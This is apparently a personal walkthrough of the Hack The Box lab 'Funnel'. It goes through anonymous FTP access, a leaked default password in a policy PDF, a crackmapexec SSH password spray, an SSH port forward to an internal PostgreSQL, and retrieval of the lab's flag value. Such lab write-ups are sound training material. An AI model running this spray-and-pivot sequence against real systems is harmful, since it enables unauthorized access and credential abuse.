Funnel IP: 10.129.182.3

rustscan:
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack


nmap:

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.117
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28 14:31 mail_backup
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel



 ftp 10.129.182.3
Connected to 10.129.182.3.
220 (vsFTPd 3.0.3)
Name (10.129.182.3:gabriel.hajdu): ftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||15945|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Nov 28 14:31 mail_backup
226 Directory send OK.
ftp> 


cat welcome_28112022 
Frome: root@funnel.htb
To: optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb
Subject:Welcome to the team!

Hello everyone,
We would like to welcome you to our team. 
We think you’ll be a great asset to the "Funnel" team and want to make sure you get settled in as smoothly as possible.
We have set up your accounts that you will need to access our internal infrastracture. Please, read through the attached password policy with extreme care.
All the steps mentioned there should be completed as soon as possible. If you have any questions or concerns feel free to reach directly to your manager. 
We hope that you will have an amazing time with us,
The funnel team. 

passwords.pdf


Default passwords — such as those created for new users — must be changed
as quickly as possible. For example the default password of “funnel123#!#” must
be changed immediately.

let's see who hasn't changed his password. Using the email addreses, we can create a user list, and try to password spray it

crackmapexec ssh 10.129.182.3 -u users.txt -p 'funnel123#!#' --continue-on-success
SSH         10.129.182.3    22     10.129.182.3     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
SSH         10.129.182.3    22     10.129.182.3     [-] root:funnel123#!# Authentication failed.
SSH         10.129.182.3    22     10.129.182.3     [-] optimus:funnel123#!# Authentication failed.
SSH         10.129.182.3    22     10.129.182.3     [-] albert:funnel123#!# Authentication failed.
SSH         10.129.182.3    22     10.129.182.3     [-] andreas:funnel123#!# Authentication failed.
SSH         10.129.182.3    22     10.129.182.3     [+] christine:funnel123#!# 
SSH         10.129.182.3    22     10.129.182.3     [-] maria:funnel123#!# Authentication failed.


christine hasn't changed her password

enumeration:

christine@funnel:~$ ss -tl
State                      Recv-Q                      Send-Q                                           Local Address:Port                                                 Peer Address:Port                     Process                     
LISTEN                     0                           4096                                                 127.0.0.1:43375                                                     0.0.0.0:*                                                    
LISTEN                     0                           4096                                             127.0.0.53%lo:domain                                                    0.0.0.0:*                                                    
LISTEN                     0                           128                                                    0.0.0.0:ssh                                                       0.0.0.0:*                                                    
LISTEN                     0                           4096                                                 127.0.0.1:postgresql                                                0.0.0.0:*                                                    
LISTEN                     0                           32                                                           *:ftp                                                             *:*                                                    
LISTEN                     0                           128                                                       [::]:ssh                                                          [::]:*    


Local Port FW:

gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Funnel]
└─$ ssh -L 1234:localhost:43375 christine@10.129.182.3
christine@10.129.182.3's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 27 Apr 2023 09:45:10 AM UTC

  System load:              0.0
  Usage of /:               63.2% of 4.78GB
  Memory usage:             13%
  Swap usage:               0%
  Processes:                161
  Users logged in:          1
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for ens160:  10.129.182.3
  IPv6 address for ens160:  dead:beef::250:56ff:fe96:cd43

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Apr 27 09:28:57 2023 from 10.10.14.117
christine@funnel:~$ 




check that it worked:

nmap -sC -sV -p 1234 localhost
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 12:51 EEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000047s latency).
Other addresses for localhost (not scanned): ::

PORT     STATE SERVICE    VERSION
1234/tcp open  postgresql PostgreSQL DB 9.6.0 or later
| fingerprint-strings: 
|   Kerberos: 
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 27265.28208: server supports 3.0 to 3.0
|     Fpostmaster.c
|     L2188
|     RProcessStartupPacket
|   SMBProgNeg: 
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 65363.19778: server supports 3.0 to 3.0
|     Fpostmaster.c
|     L2188
|_    RProcessStartupPacket
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1234-TCP:V=7.93%I=7%D=4/27%Time=644A458D%P=x86_64-pc-linux-gnu%r(Ke
SF:rberos,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20frontend\
SF:x20protocol\x2027265\.28208:\x20server\x20supports\x203\.0\x20to\x203\.
SF:0\0Fpostmaster\.c\0L2188\0RProcessStartupPacket\0\0")%r(SMBProgNeg,8C,"
SF:E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20frontend\x20protocol
SF:\x2065363\.19778:\x20server\x20supports\x203\.0\x20to\x203\.0\0Fpostmas
SF:ter\.c\0L2188\0RProcessStartupPacket\0\0");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.92 seconds



log in to postgresql:


gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Funnel]
└─$ psql -U christine -p 1234 -h localhost
Password for user christine: 
psql (15.2 (Debian 15.2-2), server 15.1 (Debian 15.1-1.pgdg110+1))
Type "help" for help.


list dbs:

christine=# \l
                                                  List of databases
   Name    |   Owner   | Encoding |  Collate   |   Ctype    | ICU Locale | Locale Provider |    Access privileges    
-----------+-----------+----------+------------+------------+------------+-----------------+-------------------------
 christine | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
 postgres  | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
 secrets   | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
 template0 | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | =c/christine           +
           |           |          |            |            |            |                 | christine=CTc/christine
 template1 | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | =c/christine           +
           |           |          |            |            |            |                 | christine=CTc/christine
(5 rows)

christine=# 
christine=# \c secrets
psql (15.2 (Debian 15.2-2), server 15.1 (Debian 15.1-1.pgdg110+1))
You are now connected to database "secrets" as user "christine".
secrets=# \dt
         List of relations
 Schema | Name | Type  |   Owner   
--------+------+-------+-----------
 public | flag | table | christine
(1 row)

secrets=# select * from flag
secrets-# select * from flag;
ERROR:  syntax error at or near "select"
LINE 2: select * from flag;
        ^
secrets=# \dt
         List of relations
 Schema | Name | Type  |   Owner   
--------+------+-------+-----------
 public | flag | table | christine
(1 row)

secrets=# select * from flag;
              value               
----------------------------------
 cf277664b1771217d7006acdea006db1
(1 row)

secrets=# 

